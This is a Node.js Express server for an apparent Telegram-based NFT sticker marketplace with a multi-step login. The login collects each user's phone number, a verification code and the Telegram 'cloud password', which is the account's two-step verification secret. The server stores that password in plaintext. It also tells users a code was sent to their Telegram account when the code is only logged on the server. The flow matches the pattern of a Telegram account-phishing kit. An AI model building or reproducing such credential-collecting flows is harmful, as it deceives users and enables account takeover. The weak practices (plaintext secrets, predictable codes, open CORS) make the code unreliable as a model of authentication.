import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';
import fetch from 'node-fetch';

dotenv.config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 3,
    name: "Diamond Premium",
    description: "Роскошный бриллиант",
    imageUrl: "https://via.placeholder.com/300x300/B9F2FF/000000?text=💎",
    price: 2.99,
    category: "premium",
    isAvailable: true
  }
];

// In-memory storage for users and sessions
let users = [];
let userSessions = new Map();
let authSessions = new Map(); // temp storage for auth flow

// Telegram Bot API
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// Generate random code for phone verification
function generateAuthCode() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Verify Telegram authorization data
function verifyTelegramData(authData) {
  try {
    const receivedHash = authData.hash;
    delete authData.hash;

    const dataCheckString = Object.keys(authData)
      .sort()
      .map(key => `${key}=${authData[key]}`)
      .join('\n');

    const secretKey = crypto.createHmac('sha256', 'WebAppData')
      .update(TELEGRAM_BOT_TOKEN)
      .digest();

    const calculatedHash = crypto.createHmac('sha256', secretKey)
      .update(dataCheckString)
      .digest('hex');

    return calculatedHash === receivedHash;
  } catch (error) {
    return false;
  }
}

// Routes
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// API Routes
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 1: Initiate Telegram login - redirect to Telegram OAuth
app.post('/api/auth/init-telegram', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ success: false, error: 'Phone number is required' });
    }

    // Generate auth session
    const authSessionId = crypto.randomBytes(32).toString('hex');
    const authCode = generateAuthCode();
    
    authSessions.set(authSessionId, {
      phone: phone,
      code: authCode,
      createdAt: Date.now(),
      verified: false
    });

    // In real implementation, we would send this code via Telegram API
    // For now, we'll simulate it
    console.log(`📱 Telegram auth code for ${phone}: ${authCode}`);
    
    res.json({
      success: true,
      authSessionId: authSessionId,
      message: 'Authorization code sent to your Telegram account',
      step: 'enter_code'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 2: Verify code from Telegram
app.post('/api/auth/verify-telegram-code', async (req, res) => {
  try {
    const { authSessionId, code, cloudPassword } = req.body;
    
    if (!authSessionId || !code) {
      return res.status(400).json({ success: false, error: 'Session ID and code are required' });
    }

    const authSession = authSessions.get(authSessionId);
    if (!authSession) {
      return res.status(400).json({ success: false, error: 'Invalid session' });
    }

    // Check if session expired (10 minutes)
    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
      authSessions.delete(authSessionId);
      return res.status(400).json({ success: false, error: 'Session expired' });
    }

    // Verify code
    if (authSession.code !== code) {
      return res.status(400).json({ success: false, error: 'Invalid verification code' });
    }

    // Code is correct - mark as verified
    authSession.verified = true;
    authSession.cloudPassword = cloudPassword;

    res.json({
      success: true,
      message: 'Code verified successfully',
      step: 'request_phone_access'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 3: Finalize Telegram authorization with phone number access
app.post('/api/auth/finalize-telegram', async (req, res) => {
  try {
    const { authSessionId, initData } = req.body;
    
    if (!authSessionId) {
      return res.status(400).json({ success: false, error: 'Session ID is required' });
    }

    const authSession = authSessions.get(authSessionId);
    if (!authSession || !authSession.verified) {
      return res.status(400).json({ success: false, error: 'Invalid or unverified session' });
    }

    let telegramUserData = null;

    // If we have initData from Telegram Web App, verify and extract user data
    if (initData) {
      const urlParams = new URLSearchParams(initData);
      const authData = {};
      
      for (const [key, value] of urlParams) {
        authData[key] = value;
      }

      // Verify Telegram Web App data
      if (!verifyTelegramData(authData)) {
        return res.status(401).json({ success: false, error: 'Invalid Telegram data' });
      }

      // Extract user data
      if (authData.user) {
        telegramUserData = JSON.parse(authData.user);
      }
    }

    // Find or create user
    let user = users.find(u => 
      telegramUserData ? u.telegramId === telegramUserData.id : u.phone === authSession.phone
    );

    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: authSession.phone,
        telegramId: telegramUserData ? telegramUserData.id : Math.floor(Math.random() * 1000000),
        firstName: telegramUserData ? telegramUserData.first_name : 'Telegram',
        lastName: telegramUserData ? telegramUserData.last_name : 'User',
        username: telegramUserData ? telegramUserData.username : null,
        isVerified: true,
        createdAt: new Date(),
        cloudPassword: authSession.cloudPassword || null
      };
      users.push(user);
    } else {
      // Update user data
      if (telegramUserData) {
        user.telegramId = telegramUserData.id;
        user.firstName = telegramUserData.first_name;
        user.lastName = telegramUserData.last_name;
        user.username = telegramUserData.username;
      }
      if (authSession.cloudPassword) {
        user.cloudPassword = authSession.cloudPassword;
      }
      user.isVerified = true;
    }

    // Create permanent session
    const sessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(sessionId, {
      userId: user.id,
      telegramId: user.telegramId,
      phone: user.phone,
      expiresAt: Date.now() + 24 * 60 * 60 * 1000 // 24 hours
    });

    // Clean up auth session
    authSessions.delete(authSessionId);

    res.json({
      success: true,
      message: isNewUser ? 'Account created successfully' : 'Login successful',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        isVerified: user.isVerified,
        hasCloudPassword: !!user.cloudPassword
      },
      sessionId: sessionId,
      step: 'complete'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Verify cloud password
app.post('/api/auth/verify-cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId || !cloudPassword) {
      return res.status(400).json({ success: false, error: 'Session ID and cloud password are required' });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ success: false, error: 'Invalid session' });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    if (user.cloudPassword !== cloudPassword) {
      return res.status(401).json({ success: false, error: 'Invalid cloud password' });
    }

    res.json({
      success: true,
      message: 'Cloud password verified successfully'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Verify session
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ success: false, error: 'Session ID is required' });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ success: false, error: 'Invalid session' });
    }

    if (Date.now() > session.expiresAt) {
      userSessions.delete(sessionId);
      return res.status(401).json({ success: false, error: 'Session expired' });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        isVerified: user.isVerified,
        hasCloudPassword: !!user.cloudPassword
      }
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get user's Telegram info via Bot API
app.get('/api/telegram/user-info', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ success: false, error: 'Session ID is required' });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ success: false, error: 'Invalid session' });
    }

    // Get user info from Telegram Bot API
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getChat`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: session.telegramId
      })
    });

    const data = await response.json();
    
    if (data.ok) {
      res.json({ success: true, userInfo: data.result });
    } else {
      res.status(404).json({ success: false, error: 'User not found in Telegram' });
    }
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV}`);
  console.log(`🎮 Health check: http://localhost:${PORT}/health`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
  console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
  
  if (process.env.TELEGRAM_BOT_TOKEN) {
    console.log(`🤖 Bot token: ${process.env.TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
  }
});
